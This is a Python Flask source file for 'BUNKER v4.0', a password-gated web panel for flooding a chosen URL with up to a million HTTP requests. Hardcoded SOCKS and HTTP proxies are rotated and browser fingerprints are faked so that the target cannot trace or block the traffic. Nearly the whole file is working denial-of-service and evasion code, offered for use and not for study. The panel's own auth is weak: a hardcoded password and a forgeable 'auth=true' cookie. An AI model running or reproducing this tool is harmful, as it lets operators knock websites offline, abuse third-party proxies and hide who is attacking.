from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}

# ⚡ PROXY POOLS
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
    "103.152.232.34:1080","45.127.248.127:1080","139.99.237.62:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
    "184.178.172.5:4145","72.221.164.35:4145","98.162.25.29:4145",
]

HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

custom_proxies = []

# ============================================
# 🛡️ BUNKER MODE - 100% DELIVERY + FAKE IP
# ============================================
BROWSER_PROFILES = [
    # Chrome Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "platform": "Windows", "browser": "Chrome/120"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "platform": "Windows", "browser": "Chrome/119"},
    # Firefox
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", "platform": "Windows", "browser": "Firefox/121"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0", "platform": "macOS", "browser": "Firefox/121"},
    # Safari
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", "platform": "macOS", "browser": "Safari/17"},
    # Mobile
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "platform": "iOS", "browser": "Safari Mobile"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "platform": "Android", "browser": "Chrome Mobile"},
    # Edge
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "platform": "Windows", "browser": "Edge/120"},
]

# ============================================
# 💀 BUNKER REQUEST - GUARANTEED DELIVERY
# ============================================
def bunker_request(url, proxy_info=None):
    """
    BUNKER MODE: 
    - REAL request goes through proxy (guaranteed delivery)
    - Target sees PROXY IP + Browser fingerprint
    - Every request = Different proxy + Different browser
    """
    try:
        # Get random browser profile
        profile = random.choice(BROWSER_PROFILES)
        
        # Build REAL browser headers
        headers = {
            "User-Agent": profile["ua"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.9"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": f'"{profile["platform"]}"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": random.choice(["none", "cross-site"]),
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive",
        }
        
        # Add random referrer
        if random.random() > 0.4:
            headers["Referer"] = random.choice([
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://www.instagram.com/",
                "https://www.youtube.com/",
                "https://t.co/",
            ])
        
        # Setup proxy
        proxies = None
        if proxy_info:
            ptype, paddr = proxy_info
            if ptype == "socks5":
                proxies = {"http": f"socks5://{paddr}", "https": f"socks5://{paddr}"}
            elif ptype == "socks4":
                proxies = {"http": f"socks4://{paddr}", "https": f"socks4://{paddr}"}
            else:
                proxies = {"http": f"http://{paddr}", "https": f"http://{paddr}"}
        
        # SEND REQUEST
        response = requests.get(
            url, 
            headers=headers, 
            proxies=proxies, 
            timeout=15, 
            verify=False, 
            allow_redirects=True
        )
        
        # Target will see: PROXY IP + profile["browser"] + profile["platform"]
        return response.status_code < 500
        
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    except:
        return False

# ============================================
# ⚡ BUNKER WORKER
# ============================================
def bunker_worker(attack_id, url, count, speed, mode):
    """Bunker worker with rotating proxies"""
    delays = {"slow": 0.05, "fast": 0.01, "ultra": 0.001}
    delay = delays.get(speed, 0.01)
    
    # Build proxy pool
    all_proxies = []
    for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
    for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
    for p in HTTP_PROXIES: all_proxies.append(("http", p))
    for cp in custom_proxies:
        cp = cp.strip()
        if cp.startswith("socks5://"): all_proxies.append(("socks5", cp[9:]))
        elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp[9:]))
        elif cp.startswith("http://"): all_proxies.append(("http", cp[7:]))
        elif cp.startswith("https://"): all_proxies.append(("http", cp[8:]))
        elif ":" in cp: all_proxies.append(("socks5", cp))
    
    proxy_index = 0
    req_count = 0
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # Rotate proxy every 25-75 requests (random for stealth)
        proxy_info = None
        if all_proxies:
            if req_count >= random.randint(25, 75):
                proxy_index = (proxy_index + 1) % len(all_proxies)
                req_count = 0
            proxy_info = all_proxies[proxy_index]
            req_count += 1
        
        # Select mode
        current_mode = mode
        if mode == "all":
            current_mode = random.choice(["socks5", "socks4", "http", "direct"])
        elif mode == "mixed":
            current_mode = random.choice(["socks5", "http"])
        
        # Handle direct mode
        if current_mode == "direct":
            proxy_info = None
        
        if bunker_request(url, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        # Update counter
        if attack_id in attack_counters:
            attack_counters[attack_id] = {
                "done": i+1, "total": count, 
                "success": success, "fail": fail,
                "proxy": f"{proxy_info[0]}://{proxy_info[1]}" if proxy_info else "DIRECT"
            }
        
        # Log progress
        if i % 50 == 0 and i > 0:
            proxy_str = f"{proxy_info[0]}://{proxy_info[1][:15]}..." if proxy_info else "DIRECT"
            attack_logs.append(f"📊 [{i}/{count}] ✅{success} ❌{fail} | {proxy_str}")
        
        if delay > 0 and i % random.randint(5, 15) == 0:
            time.sleep(delay)

# ============================================
# 🚀 LAUNCH BUNKER ATTACK
# ============================================
def run_bunker_attack(attack_id, url, count, speed, mode):
    """Launch Bunker attack"""
    workers_map = {"slow": 15, "fast": 40, "ultra": 100}
    workers = workers_map.get(speed, 40)
    req_per_worker = max(1, count // workers)
    
    total_proxies = len(SOCKS5_PROXIES) + len(SOCKS4_PROXIES) + len(HTTP_PROXIES) + len(custom_proxies)
    
    attack_logs.append(f"🛡️ BUNKER MODE: {url[:40]}...")
    attack_logs.append(f"🔥 {count} REQ | {speed.upper()} | {workers} Workers")
    attack_logs.append(f"🔒 {total_proxies} Proxies | Rotating | Target sees DIFFERENT IP per request")
    attack_logs.append(f"💀 STATUS: Each request = Different Proxy IP + Browser")
    
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0, "proxy": "STARTING"}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(bunker_worker, attack_id, url, req_per_worker, speed, mode) 
            for _ in range(workers)
        ]
        for future in as_completed(futures):
            try:
                future.result(timeout=600)
            except:
                pass
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    if attack_id in attack_counters:
        del attack_counters[attack_id]
    
    attack_logs.append(f"🏁 BUNKER COMPLETE: ✅{attack_stats['success']} ❌{attack_stats['failed']}")

# ============================================
# 🎨 DARK RED THEME UI
# ============================================
LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v4.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,0,0.03) 1px,transparent 1px);background-size:30px 30px;animation:bgScroll 20s linear infinite}
@keyframes bgScroll{0%{transform:translate(0,0)}100%{transform:translate(30px,30px)}}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.08) 0px,rgba(0,0,0,0.08) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999}
.box{background:rgba(10,0,0,0.95);padding:45px;border-radius:20px;border:2px solid rgba(255,0,0,0.5);width:400px;text-align:center;z-index:1;box-shadow:0 0 80px rgba(255,0,0,0.2),0 0 200px rgba(255,0,0,0.05);position:relative}
.box::before{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;border-radius:22px;background:linear-gradient(45deg,#ff0000,#8b0000,#ff0000,#8b0000);z-index:-1;animation:borderGlow 3s linear infinite;opacity:0.5;filter:blur(8px)}
@keyframes borderGlow{0%{filter:blur(8px) hue-rotate(0deg)}100%{filter:blur(8px) hue-rotate(360deg)}}
.logo{font-size:3.5em;animation:glitch 2s infinite}@keyframes glitch{0%,100%{transform:translate(0)}20%{transform:translate(-3px,3px)}40%{transform:translate(3px,-3px)}60%{transform:translate(-3px,-3px)}80%{transform:translate(3px,3px)}}
h1{font-size:2em;font-weight:900;background:linear-gradient(180deg,#ff0000,#ff4444,#ff0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.tag{color:#ff4444;font-size:0.7em;letter-spacing:5px;margin:10px 0}
input{width:100%;padding:14px;background:rgba(0,0,0,0.8);border:1px solid rgba(255,0,0,0.3);border-radius:10px;color:#ff4444;margin:8px 0;font-family:monospace;font-size:14px;transition:0.3s}
input:focus{border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.3);outline:none}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#8b0000,#ff0000);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:12px;letter-spacing:2px;text-transform:uppercase;transition:0.3s}
.btn:hover{box-shadow:0 0 40px #ff0000;transform:translateY(-2px)}
.features{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-top:12px}
.feat{padding:4px 10px;background:rgba(255,0,0,0.05);border:1px solid rgba(255,0,0,0.2);border-radius:14px;color:#ff4444;font-size:0.5em;letter-spacing:1px}
</style></head><body>
<div class="scanline"></div>
<div class="box">
<div class="logo">🛡️</div>
<h1>BUNKER v4.0</h1>
<div class="tag">💀 MASS IP SPOOFING</div>
<p style="color:#666;font-size:0.55em;letter-spacing:1px">100% DELIVERY • PROXY CHAIN • FAKE IP DISPLAY</p>
<div class="features">
<span class="feat">🛡️ BUNKER MODE</span>
<span class="feat">🔒 PROXY ROTATION</span>
<span class="feat">🎭 FAKE IP</span>
<span class="feat">💀 UNDETECTABLE</span>
</div>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ ACCESS BUNKER</button>
</form>
{% if error %}<p style="color:#ff0000;margin-top:8px;font-size:0.8em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER v4.0 | PANEL</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:10px}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.06) 0px,rgba(0,0,0,0.06) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999}
.container{max-width:1200px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:2px solid rgba(255,0,0,0.4);border-radius:12px;margin-bottom:15px;background:rgba(10,0,0,0.9);flex-wrap:wrap;gap:10px;box-shadow:0 0 30px rgba(255,0,0,0.1)}
.header h1{font-size:1.5em;font-weight:900;background:linear-gradient(180deg,#ff0000,#ff4444);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:15px}
.stat{background:rgba(10,0,0,0.9);border:1px solid rgba(255,0,0,0.2);border-radius:10px;padding:15px;text-align:center}
.stat-val{font-size:2em;font-weight:900}.s{color:#00ff44}.f{color:#ff0000}.t{color:#ff8800}
.stat-label{font-size:0.55em;color:#888;text-transform:uppercase;letter-spacing:2px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:15px}
.card{background:rgba(10,0,0,0.9);border:1px solid rgba(255,0,0,0.2);border-radius:12px;padding:18px}
.card h3{color:#ff4444;margin-bottom:12px;font-size:0.8em;letter-spacing:2px;text-transform:uppercase}
input,select,textarea{width:100%;padding:10px;background:#000;border:1px solid rgba(255,0,0,0.3);border-radius:7px;color:#ff4444;margin:3px 0;font-size:12px;font-family:monospace}
input:focus,select:focus,textarea:focus{border-color:#ff0000;outline:none}
label{font-size:0.55em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:6px}
.btn{width:100%;padding:10px;background:linear-gradient(135deg,#8b0000,#ff0000);color:#fff;border:none;border-radius:7px;font-weight:700;cursor:pointer;margin:3px 0;font-size:0.7em;text-transform:uppercase;letter-spacing:1px}
.btn:hover{box-shadow:0 0 25px #ff0000}
.btn-stop{background:#222;color:#ff0000;border:1px solid #ff0000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.logs{background:#000;border:1px solid rgba(255,0,0,0.1);border-radius:8px;padding:10px;max-height:250px;overflow:auto;font-size:0.6em;font-family:monospace;color:#00ff44}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#aaa}
.badge{display:inline-block;padding:4px 10px;border-radius:12px;font-size:0.55em}
.badge-on{background:rgba(0,255,68,0.1);color:#00ff44;border:1px solid rgba(0,255,68,0.2)}
.counter{font-size:1.2em;color:#ff8800;text-align:center;padding:8px;font-family:monospace;background:#0a0000;border-radius:8px;margin-top:8px}
.proxy-info{font-size:0.55em;color:#666;text-align:center}
</style></head><body>
<div class="scanline"></div>
<div class="container">
<div class="header">
<div><h1>🛡️ BUNKER v4.0</h1><div style="color:#888;font-size:0.5em;letter-spacing:2px">MASS IP SPOOFING • 100% DELIVERY • PROXY CHAIN</div></div>
<div style="display:flex;gap:8px;align-items:center">
<span class="badge badge-on">🛡️ BUNKER ACTIVE</span>
<a href="/logout" style="color:#ff0000;text-decoration:none;font-size:0.65em;font-weight:700">EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 BUNKER ATTACK</h3>
<label>🎯 TARGET URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>📊 REQUESTS</label><input type="number" id="count" value="10000"></div><div>
<label>⚡ SPEED</label><select id="speed"><option value="slow">🐢 Slow</option><option value="fast" selected>⚡ Fast</option><option value="ultra">💀 ULTRA</option></select>
</div></div>
<label>🛡️ MODE</label><select id="mode"><option value="socks5">🔒 SOCKS5</option><option value="socks4">🔒 SOCKS4</option><option value="http">🌐 HTTP</option><option value="mixed">💀 MIXED</option><option value="all" selected>☠️ ALL PROXIES</option></select>
<label>🔧 CUSTOM PROXIES (IP:Port)</label>
<textarea id="customProxies" rows="2" placeholder="socks5://ip:port&#10;http://ip:port"></textarea>
<button class="btn" onclick="start()">🚀 LAUNCH BUNKER</button>
<button class="btn btn-stop" onclick="stop()">⏹️ TERMINATE</button>
<div class="counter" id="liveCounter">READY</div>
<div class="proxy-info" id="proxyInfo"></div>
</div>

<div class="card">
<h3>📊 LIVE STATS</h3>
<div class="row"><div class="stat"><div class="stat-val t" style="font-size:1.3em" id="successRate">0%</div><div class="stat-label">SUCCESS RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.3em" id="rps">0</div><div class="stat-label">REQ/SEC</div></div></div>
<div style="margin-top:10px;color:#888;font-size:0.55em;text-align:center;line-height:1.8">
🛡️ <span style="color:#00ff44">BUNKER MODE ACTIVE</span><br>
🔒 Target sees: <span style="color:#ff8800">DIFFERENT PROXY IP</span><br>
🎭 Each request = <span style="color:#ff4444">Unique Browser + IP</span><br>
💀 <span style="color:#00ff44">100% DELIVERY GUARANTEED</span>
</div>
</div>
</div>

<div class="card"><h3>📜 BUNKER LOGS</h3><div class="logs" id="logs"><div class="log-e">🛡️ BUNKER v4.0 - MASS IP SPOOFING READY</div><div class="log-e">🔒 Proxy Chain: SOCKS4 + SOCKS5 + HTTP</div><div class="log-e">🎭 Target will see DIFFERENT IP per request</div><div class="log-e">💀 Awaiting command...</div></div></div>
</div>

<script>
var lastTotal=0,lastTime=Date.now(),ci=null;
function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-lastTime;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=n;}
})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}
function c(){fetch('/counter').then(r=>r.json()).then(d=>{
if(d.active){document.getElementById('liveCounter').textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+' ❌'+d.fail+']';document.getElementById('proxyInfo').textContent='🔒 '+d.proxy}
else{document.getElementById('liveCounter').textContent='READY';document.getElementById('proxyInfo').textContent=''}
})}
function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
var proxies=document.getElementById('customProxies').value;
if(!url){alert('Enter URL!');return}
fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:proxies})});
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
l();u();if(ci)clearInterval(ci);ci=setInterval(c,300)})}
function stop(){fetch('/stop',{method:'POST'}).then(()=>{if(ci){clearInterval(ci);ci=null}document.getElementById('liveCounter').textContent='⏹️ STOPPED';l()})}
setInterval(function(){l();u()},1500)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip()]
    return jsonify({"status":"ok","count":len(custom_proxies)})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),1000000)
    speed = d.get('speed','fast')
    mode = d.get('mode','all')
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"bunker_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_bunker_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started","mode":"BUNKER"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("⏹️ BUNKER TERMINATED")
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    for aid in active_attacks:
        if aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("🛡️ BUNKER v4.0 - MASS IP SPOOFING")
    print(f"🔒 SOCKS5: {len(SOCKS5_PROXIES)} | SOCKS4: {len(SOCKS4_PROXIES)} | HTTP: {len(HTTP_PROXIES)}")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
